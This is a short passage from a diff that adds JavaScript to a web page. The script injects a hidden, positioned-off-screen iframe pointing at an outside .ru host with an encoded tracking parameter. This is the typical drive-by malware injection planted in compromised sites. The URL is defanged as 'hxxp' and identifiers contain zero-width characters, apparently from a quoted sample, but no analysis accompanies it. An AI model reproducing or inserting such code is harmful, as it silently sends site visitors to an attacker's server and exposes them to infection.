@@ -1,0 +1,12 @@
+ame.
+
+if (do​cument.get​Elements​ByTagName('body')[0]){   iframer();
+}
+else {
+  do​cument.wr​ite("
+&lt;if rame src='hxxp://​g3service​.ru​/in.php?a=QQkFBwQEAAADBgAGEkcJBQcEAQQHDQAMAg==' width='10'
+ height='10' style='visibility:hidden;position:absolute;left:0;top:0;'&gt;&lt;/iframe&gt;");
+}
+function iframer(){
+  var f = do​cument.cr​eateElement('iframe');
+  f.setAttribute('src'
